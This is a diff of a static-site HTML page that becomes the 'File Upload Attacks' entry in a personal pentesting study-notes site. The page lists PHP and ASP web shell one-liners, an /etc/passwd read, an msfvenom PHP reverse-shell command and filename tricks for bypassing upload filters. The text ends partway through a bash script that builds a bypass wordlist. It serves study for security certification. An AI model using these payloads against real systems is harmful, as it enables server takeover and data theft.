@@ -9,26 +9,28 @@
       
       
       
+        <link rel="prev" href="../file-inclusion/">
       
-        <link rel="next" href="study-notes/owasp-top-10-2025/">
+      
+        <link rel="next" href="../hacking-wordpress/">
       
       
         
       
       
-      <link rel="icon" href="assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
-        <title>Dan's Cyber Stuff</title>
+        <title>File Upload Attacks - Dan's Cyber Stuff</title>
       
     
     
-      <link rel="stylesheet" href="assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -47,7 +49,7 @@
       
     
     
-    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -72,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#dans-cyber-stuff" class="md-skip">
+        <a href="#file-upload-attacks" class="md-skip">
           Skip to content
         </a>
       
@@ -88,7 +90,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="." title="Dan&#39;s Cyber Stuff" class="md-header__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
+    <a href="../../.." title="Dan&#39;s Cyber Stuff" class="md-header__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -108,7 +110,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Home
+              File Upload Attacks
             
           </span>
         </div>
@@ -212,7 +214,7 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="." title="Dan&#39;s Cyber Stuff" class="md-nav__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
+    <a href="../../.." title="Dan&#39;s Cyber Stuff" class="md-nav__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -227,37 +229,10 @@
       
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Home
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="." class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
         
   
   
@@ -273,109 +248,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#study-notes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Study Notes
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Study Notes">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#bug-bounty-hunting" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Bug Bounty Hunting
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#bscp-study-notes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        BSCP Study Notes
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#cwee-study-notes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        CWEE Study Notes
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#cwes-study-notes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        CWES Study Notes
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#android-application-pentesting" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Android Application Pentesting
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#tools-and-protocols" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Tools and Protocols
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -384,18 +256,20 @@
       
   
   
+    
   
   
+  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
         
           
           <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
@@ -416,7 +290,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             
@@ -481,7 +355,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/owasp-top-10-2025/" class="md-nav__link">
+      <a href="../../owasp-top-10-2025/" class="md-nav__link">
         
   
   
@@ -509,7 +383,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/reconnaissance/" class="md-nav__link">
+      <a href="../../reconnaissance/" class="md-nav__link">
         
   
   
@@ -537,7 +411,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/reporting-and-poc/" class="md-nav__link">
+      <a href="../../reporting-and-poc/" class="md-nav__link">
         
   
   
@@ -565,7 +439,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/tech-interview-prep/" class="md-nav__link">
+      <a href="../../tech-interview-prep/" class="md-nav__link">
         
   
   
@@ -648,7 +522,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/bscp-study-notes/" class="md-nav__link">
+      <a href="../../bscp-study-notes/" class="md-nav__link">
         
   
   
@@ -676,7 +550,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/bscp-study-notes/authentication-vulnerabilities/" class="md-nav__link">
+      <a href="../../bscp-study-notes/authentication-vulnerabilities/" class="md-nav__link">
         
   
   
@@ -704,7 +578,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/bscp-study-notes/business-logic-vulnerabilities/" class="md-nav__link">
+      <a href="../../bscp-study-notes/business-logic-vulnerabilities/" class="md-nav__link">
         
   
   
@@ -732,7 +606,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/bscp-study-notes/command-injection/" class="md-nav__link">
+      <a href="../../bscp-study-notes/command-injection/" class="md-nav__link">
         
   
   
@@ -760,7 +634,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/bscp-study-notes/cross-site-scripting/" class="md-nav__link">
+      <a href="../../bscp-study-notes/cross-site-scripting/" class="md-nav__link">
         
   
   
@@ -788,7 +662,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/bscp-study-notes/path-traversal/" class="md-nav__link">
+      <a href="../../bscp-study-notes/path-traversal/" class="md-nav__link">
         
   
   
@@ -816,7 +690,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/bscp-study-notes/sql-injection/" class="md-nav__link">
+      <a href="../../bscp-study-notes/sql-injection/" class="md-nav__link">
         
   
   
@@ -899,7 +773,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwee-study-notes/" class="md-nav__link">
+      <a href="../../cwee-study-notes/" class="md-nav__link">
         
   
   
@@ -927,7 +801,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwee-study-notes/attacking-authentication-mechanisms/" class="md-nav__link">
+      <a href="../../cwee-study-notes/attacking-authentication-mechanisms/" class="md-nav__link">
         
   
   
@@ -955,7 +829,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwee-study-notes/injection-attacks/" class="md-nav__link">
+      <a href="../../cwee-study-notes/injection-attacks/" class="md-nav__link">
         
   
   
@@ -983,7 +857,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwee-study-notes/introduction-to-nosql-injection/" class="md-nav__link">
+      <a href="../../cwee-study-notes/introduction-to-nosql-injection/" class="md-nav__link">
         
   
   
@@ -1011,7 +885,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwee-study-notes/intro-to-whitebox-pentesting/" class="md-nav__link">
+      <a href="../../cwee-study-notes/intro-to-whitebox-pentesting/" class="md-nav__link">
         
   
   
@@ -1044,18 +918,20 @@
                 
   
   
+    
   
   
+  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" checked>
         
           
           <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
@@ -1076,7 +952,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2_4">
             <span class="md-nav__icon md-icon"></span>
             
@@ -1094,7 +970,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/api-attacks/" class="md-nav__link">
+      <a href="../api-attacks/" class="md-nav__link">
         
   
   
@@ -1122,7 +998,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/attacking-common-applications/" class="md-nav__link">
+      <a href="../attacking-common-applications/" class="md-nav__link">
         
   
   
@@ -1150,7 +1026,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/attacking-graphql/" class="md-nav__link">
+      <a href="../attacking-graphql/" class="md-nav__link">
         
   
   
@@ -1178,7 +1054,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/attacking-web-applications-with-ffuf/" class="md-nav__link">
+      <a href="../attacking-web-applications-with-ffuf/" class="md-nav__link">
         
   
   
@@ -1206,7 +1082,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/broken-authentication/" class="md-nav__link">
+      <a href="../broken-authentication/" class="md-nav__link">
         
   
   
@@ -1234,7 +1110,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/command-injections/" class="md-nav__link">
+      <a href="../command-injections/" class="md-nav__link">
         
   
   
@@ -1262,7 +1138,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/cross-site-scripting-%28xss%29/" class="md-nav__link">
+      <a href="../cross-site-scripting-%28xss%29/" class="md-nav__link">
         
   
   
@@ -1290,7 +1166,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/file-inclusion/" class="md-nav__link">
+      <a href="../file-inclusion/" class="md-nav__link">
         
   
   
@@ -1315,10 +1191,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/file-upload-attacks/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload Attacks
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1334,6 +1237,126 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#web-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web Shells
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bypasses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bypasses
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Bypasses">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#creating-character-injection-wordlist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Creating Character Injection Wordlist
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#limiting-content-type-wordlist-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Limiting Content-Type wordlist example
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#limited-uploads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Limited Uploads
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Limited Uploads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#other-upload-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Other Upload Attacks
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1346,7 +1369,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/hacking-wordpress/" class="md-nav__link">
+      <a href="../hacking-wordpress/" class="md-nav__link">
         
   
   
@@ -1374,7 +1397,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/javascript-deobfuscation/" class="md-nav__link">
+      <a href="../javascript-deobfuscation/" class="md-nav__link">
         
   
   
@@ -1402,7 +1425,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/login-brute-forcing/" class="md-nav__link">
+      <a href="../login-brute-forcing/" class="md-nav__link">
         
   
   
@@ -1430,7 +1453,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/server-side-attacks/" class="md-nav__link">
+      <a href="../server-side-attacks/" class="md-nav__link">
         
   
   
@@ -1458,7 +1481,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/session-security/" class="md-nav__link">
+      <a href="../session-security/" class="md-nav__link">
         
   
   
@@ -1486,7 +1509,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/sql-injection-fundamentals/" class="md-nav__link">
+      <a href="../sql-injection-fundamentals/" class="md-nav__link">
         
   
   
@@ -1514,7 +1537,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/sqlmap-essentials/" class="md-nav__link">
+      <a href="../sqlmap-essentials/" class="md-nav__link">
         
   
   
@@ -1542,7 +1565,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/web-attacks/" class="md-nav__link">
+      <a href="../web-attacks/" class="md-nav__link">
         
   
   
@@ -1570,7 +1593,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/web-fuzzing/" class="md-nav__link">
+      <a href="../web-fuzzing/" class="md-nav__link">
         
   
   
@@ -1598,7 +1621,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/cwes-study-notes/web-service-and-api-attacks/" class="md-nav__link">
+      <a href="../web-service-and-api-attacks/" class="md-nav__link">
         
   
   
@@ -1681,7 +1704,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/android-application-pentesting/" class="md-nav__link">
+      <a href="../../android-application-pentesting/" class="md-nav__link">
         
   
   
@@ -1709,7 +1732,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/android-application-pentesting/android-fundamentals/" class="md-nav__link">
+      <a href="../../android-application-pentesting/android-fundamentals/" class="md-nav__link">
         
   
   
@@ -1737,7 +1760,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/android-application-pentesting/android-application-static-analysis/" class="md-nav__link">
+      <a href="../../android-application-pentesting/android-application-static-analysis/" class="md-nav__link">
         
   
   
@@ -1765,7 +1788,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/android-application-pentesting/android-application-dynamic-analysis/" class="md-nav__link">
+      <a href="../../android-application-pentesting/android-application-dynamic-analysis/" class="md-nav__link">
         
   
   
@@ -1848,7 +1871,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/tools-and-protocols/curl/" class="md-nav__link">
+      <a href="../../tools-and-protocols/curl/" class="md-nav__link">
         
   
   
@@ -1876,7 +1899,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/tools-and-protocols/ftp/" class="md-nav__link">
+      <a href="../../tools-and-protocols/ftp/" class="md-nav__link">
         
   
   
@@ -1904,7 +1927,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/tools-and-protocols/gobuster/" class="md-nav__link">
+      <a href="../../tools-and-protocols/gobuster/" class="md-nav__link">
         
   
   
@@ -1932,7 +1955,7 @@
   
   
     <li class="md-nav__item">
-      <a href="study-notes/tools-and-protocols/nmap/" class="md-nav__link">
+      <a href="../../tools-and-protocols/nmap/" class="md-nav__link">
         
   
   
@@ -1995,22 +2018,33 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#study-notes" class="md-nav__link">
+  <a href="#web-shells" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Study Notes
+        Web Shells
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Study Notes">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bypasses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bypasses
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Bypasses">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#bug-bounty-hunting" class="md-nav__link">
+  <a href="#creating-character-injection-wordlist" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Bug Bounty Hunting
+        Creating Character Injection Wordlist
       
     </span>
   </a>
@@ -2018,54 +2052,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#bscp-study-notes" class="md-nav__link">
+  <a href="#limiting-content-type-wordlist-example" class="md-nav__link">
     <span class="md-ellipsis">
       
-        BSCP Study Notes
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#cwee-study-notes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        CWEE Study Notes
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#cwes-study-notes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        CWES Study Notes
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#android-application-pentesting" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Android Application Pentesting
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#tools-and-protocols" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Tools and Protocols
+        Limiting Content-Type wordlist example
       
     </span>
   </a>
@@ -2074,6 +2064,56 @@
         
       </ul>
     </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#limited-uploads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Limited Uploads
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Limited Uploads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#other-upload-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Other Upload Attacks
+      
+    </span>
+  </a>
   
 </li>
       
@@ -2094,70 +2134,251 @@
 
 
 
-<h1 id="dans-cyber-stuff">Dan's Cyber Stuff</h1>
-<p>Welcome to Dan's Cyber Stuff!</p>
-<h2 id="study-notes">Study Notes</h2>
-<h3 id="bug-bounty-hunting">Bug Bounty Hunting</h3>
+<h1 id="file-upload-attacks">File Upload Attacks</h1>
+<p><strong>Tips:</strong> 
+- Find what language runs the web app by fuzzing the extention of the index page for common file types (/index.FUZZ).
+- "Open image in new tab" to see upload location (maybe encoded in the URL).</p>
+<p><a href="https://www.wappalyzer.com/">Wappalyzer</a> can also be used to detect what languages and othertechnologies are used.</p>
+<h2 id="web-shells">Web Shells</h2>
+<table>
+<thead>
+<tr>
+<th>Web Shell</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;?php echo file_get_contents('/etc/passwd'); ?&gt;</code></td>
+<td>Basic PHP File Read</td>
+</tr>
+<tr>
+<td><code>&lt;?php system('hostname'); ?&gt;</code></td>
+<td>Basic PHP Command Execution</td>
+</tr>
+<tr>
+<td><code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code></td>
+<td>Basic PHP Web Shell</td>
+</tr>
+<tr>
+<td><code>&lt;% eval request('cmd') %&gt;</code></td>
+<td>Basic ASP Web Shell</td>
+</tr>
+<tr>
+<td><code>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw &gt; reverse.php</code></td>
+<td>Generate PHP reverse shell</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Arrexel/phpbash">PHP Web Shell</a></td>
+<td>PHP Web Shell</td>
+</tr>
+<tr>
+<td><a href="https://github.com/pentestmonkey/php-reverse-shell">PHP Reverse Shell</a></td>
+<td>PHP Reverse Shell</td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells">Web/Reverse Shells</a></td>
+<td>List of Web Shells and Reverse Shells</td>
+</tr>
+</tbody>
+</table>
+<h2 id="bypasses">Bypasses</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Client-Side Bypass (firefox shortcuts)</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>[CTRL+SHIFT+C]</code></td>
+<td>Toggle Page Inspector and amend front end code (also inspect displayed files after upload to find location) or use burp to alter request</td>
+</tr>
+<tr>
+<td><code>[CTRL+SHIFT+K]</code></td>
+<td>Load browser console to review JS functions by typing their name in</td>
+</tr>
+<tr>
+<td><strong>Blacklist Bypass (Can terst in burp intruder tab(may need to diable URL encoding))</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>shell.phtml</code></td>
+<td>Uncommon Extension</td>
+</tr>
+<tr>
+<td><code>shell.pHp</code></td>
+<td>Case Manipulation</td>
+</tr>
+<tr>
+<td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst">PHP Extensions</a></td>
+<td>List of PHP Extensions</td>
+</tr>
+<tr>
+<td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP">ASP Extensions</a></td>
+<td>List of ASP Extensions</td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt">Web Extensions</a></td>
+<td>List of Web Extensions</td>
+</tr>
+<tr>
+<td><strong>Whitelist Bypass (try fuzzing with web exstentions wordlist first to see what are accepted)</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>shell.jpg.php</code></td>
+<td>Double Extension</td>
+</tr>
+<tr>
+<td><code>shell.php.jpg</code></td>
+<td>Reverse Double Extension (works when missconfigured webserver will execute because contains php and whitelist allows jpg (may need fuzzing php ext also (php7.jpg etc)))</td>
+</tr>
+<tr>
+<td><code>%20, %0a, %00, %0d0a, /, .\, ., …</code></td>
+<td>Character Injection - Before/After Extension</td>
+</tr>
+<tr>
+<td><strong>Content/Type Bypass (Content-Type header check), fuzz contrent type in burp</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt">Content-Types</a></td>
+<td>List of All Content-Types</td>
+</tr>
+<tr>
+<td><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">File Signatures</a></td>
+<td>List of File Signatures/<a href="https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime">Magic Bytes</a> (first bytes of a file indicate its MIME-type)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Note:</strong> A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as POST data), in which case we will need to modify the main Content-Type header.</p>
+<h3 id="creating-character-injection-wordlist">Creating Character Injection Wordlist</h3>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><span class="k">for</span><span class="w"> </span>char<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;%20&#39;</span><span class="w"> </span><span class="s1">&#39;%0a&#39;</span><span class="w"> </span><span class="s1">&#39;%00&#39;</span><span class="w"> </span><span class="s1">&#39;%0d0a&#39;</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="w"> </span><span class="s1">&#39;.\\&#39;</span><span class="w"> </span><span class="s1">&#39;.&#39;</span><span class="w"> </span><span class="s1">&#39;…&#39;</span><span class="w"> </span><span class="s1">&#39;:&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-0-2"><span class="w">    </span><span class="k">for</span><span class="w"> </span>ext<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;.php&#39;</span><span class="w"> </span><span class="s1">&#39;.phps&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="c1"># can add more php ext here</span>
+</span><span id="__span-0-3"><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell</span><span class="nv">$char$ext</span><span class="s2">.jpg&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
+</span><span id="__span-0-4"><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell</span><span class="nv">$ext$char</span><span class="s2">.jpg&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
+</span><span id="__span-0-5"><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell.jpg</span><span class="nv">$char$ext</span><span class="s2">&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
